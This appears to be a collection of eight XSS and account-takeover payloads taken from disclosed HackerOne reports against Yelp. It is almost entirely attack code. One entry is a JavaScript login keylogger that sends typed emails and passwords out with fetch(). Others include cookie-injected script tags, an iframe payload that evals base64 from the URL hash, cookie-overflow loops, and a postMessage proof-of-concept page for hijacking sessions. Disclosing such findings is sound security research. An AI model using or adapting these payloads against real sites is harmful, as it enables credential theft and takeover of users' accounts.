# Yelp

8 payloads.

### `0b6f0e20`

```
<script>debugger</script>
```

**Parameter:** `city`
— [Self-XSS via location cookie city field when getting suggestions for a new location](https://hackerone.com/reports/166709) · Yelp · [haquaman](https://hackerone.com/haquaman)

### `a9e085cc`

```
Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Domain=.target.com; Path=/; Secure;
```

— [target.com XSS ATO (via login keylogger, link Google account)](https://hackerone.com/reports/2010530) · Yelp · [lil_endian](https://hackerone.com/lil_endian)

### `b693a81c`

```
Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Max-Age=99999999; Domain=.target.com; Path=/; Secure; SameSite=Lax
```

— [target.com XSS ATO (via login keylogger, link Google account)](https://hackerone.com/reports/2010530) · Yelp · [lil_endian](https://hackerone.com/lil_endian)

### `aba05e40`

```
setTimeout(function () {
  a = document.getElementsByName('password')[0];
  b = document.getElementsByName('email')[0];
  function f() {
    fetch(`https://target.com/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`);
  }
  a.form.onclick=f;
  a.onchange=f;
  b.onchange=f;
  a.oninput=f;
  b.oninput=f;
}, 1000)
```

— [target.com XSS ATO (via login keylogger, link Google account)](https://hackerone.com/reports/2010530) · Yelp · [lil_endian](https://hackerone.com/lil_endian)

### `15dd2fdb`

```
"<iframe/onload=eval(atob(location.hash.substring(1)))>"@calc.sh
```

**Parameter:** `email`
— [target.com and evil.com ATO via XSS + Cookie Bridge](https://hackerone.com/reports/2089042) · Yelp · [lil_endian](https://hackerone.com/lil_endian)

### `efa06180`

```
for (var i = 0; i < 15; i++) {document.cookie = `X${i}=${'X'.repeat(1000)}; max-age=86400; path=/cookie_bridge/retrieve`}
```

— [target.com and evil.com ATO via XSS + Cookie Bridge](https://hackerone.com/reports/2089042) · Yelp · [lil_endian](https://hackerone.com/lil_endian)

### `9806bc81`

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>yelp xss poc</title>
  <script>
    function openTarget() {
      t = document.location.hash.substring(1);
      window.target = window.open(t);
    }

    // register a postmessage listener
    window.addEventListener('message', function (e) {
      console.log(e);
      if (e.data && e.data.redirect) {
        location.href = e.data.redirect; // this is vulnerable to xss but idc
      }
    });

  </script>
</head>
<body
```

— [target.com and evil.com ATO via XSS + Cookie Bridge](https://hackerone.com/reports/2089042) · Yelp · [lil_endian](https://hackerone.com/lil_endian)

### `1c2a1ca6`

```
for (var i = 0; i < 16; i++) {document.cookie = `X${i}=${'X'.repeat(1000)}; max-age=86400; path=/cookie_bridge/retrieve`}
window.opener.postMessage({redirect:"https://target.com/cookie_bridge/store?dhl=da_DK"}, "*");
setTimeout(function() {alert("attacker can now sign in as victim by going to:" + window.opener.location.href)}, 5000);
```

— [target.com and evil.com ATO via XSS + Cookie Bridge](https://hackerone.com/reports/2089042) · Yelp · [lil_endian](https://hackerone.com/lil_endian)
